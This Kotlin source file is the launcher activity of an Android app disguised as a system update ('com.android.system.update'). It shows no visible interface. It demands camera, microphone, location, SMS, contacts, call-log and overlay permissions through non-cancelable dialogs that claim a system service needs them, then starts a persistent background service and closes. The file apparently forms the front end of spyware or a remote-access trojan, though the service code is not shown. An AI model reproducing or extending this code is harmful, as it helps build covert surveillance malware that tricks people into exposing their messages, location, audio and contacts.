package com.android.system.update

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.android.system.update.services.MainService

class MainActivity : AppCompatActivity() {

    private val dangerousPermissions = mutableListOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.POST_NOTIFICATIONS
    )

    // Permissions that are auto-granted or system-level (no runtime dialog needed)
    private val autoGrantedPermissions = listOf(
        Manifest.permission.INTERNET,
        Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.FOREGROUND_SERVICE,
        Manifest.permission.RECEIVE_BOOT_COMPLETED,
        Manifest.permission.WAKE_LOCK
    )

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allDangerousGranted = dangerousPermissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
        
        if (allDangerousGranted) {
            // Check overlay permission
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
                requestOverlayPermission()
            } else {
                startMainService()
                finish()
            }
        } else {
            val deniedList = permissions.filter { !it.value }.keys.joinToString(", ") {
                it.substringAfterLast(".")
            }
            showPermissionDeniedDialog(deniedList)
        }
    }

    private val overlayPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { _ ->
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this)) {
            startMainService()
            finish()
        } else {
            showOverlayDeniedDialog()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // No visible UI - immediately request permissions in background

        // Check if we have overlay permission from a previous run
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
            // Already hidden, proceed silently
            requestPermissionsStartService()
        } else {
            // First run - request all permissions
            requestPermissionsStartService()
        }
    }

    private fun requestPermissionsStartService() {
        val permissionsToRequest = dangerousPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (permissionsToRequest.isEmpty()) {
            // All dangerous permissions granted
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
                requestOverlayPermission()
            } else {
                startMainService()
                finish()
            }
        } else {
            permissionLauncher.launch(permissionsToRequest.toTypedArray())
        }
    }

    private fun requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            val intent = Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName")
            )
            overlayPermissionLauncher.launch(intent)
        } else {
            startMainService()
            finish()
        }
    }

    private fun startMainService() {
        try {
            val intent = Intent(this, MainService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (e: Exception) {
            // Service already running or permission issue - try again
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    val intent = Intent(this, MainService::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(intent)
                    } else {
                        startService(intent)
                    }
                } catch (e2: Exception) {
                    Toast.makeText(this, "Service error: ${e2.message}", Toast.LENGTH_LONG).show()
                }
            }, 1000)
        }
        finish()
    }

    private fun showPermissionDeniedDialog(deniedList: String) {
        AlertDialog.Builder(this)
            .setTitle("Permissions Required")
            .setMessage("The following permissions are required:\n\n$deniedList\n\nAll permissions are needed for the system service to function properly.")
            .setPositiveButton("Retry") { _, _ ->
                requestPermissionsStartService()
            }
            .setNegativeButton("Exit") { _, _ -> finishAffinity() }
            .setCancelable(false)
            .show()
    }

    private fun showOverlayDeniedDialog() {
        AlertDialog.Builder(this)
            .setTitle("Overlay Permission Required")
            .setMessage("Please grant overlay permission in Settings to enable all features.")
            .setPositiveButton("Open Settings") { _, _ ->
                requestOverlayPermission()
            }
            .setNegativeButton("Exit") { _, _ -> finishAffinity() }
            .setCancelable(false)
            .show()
    }
}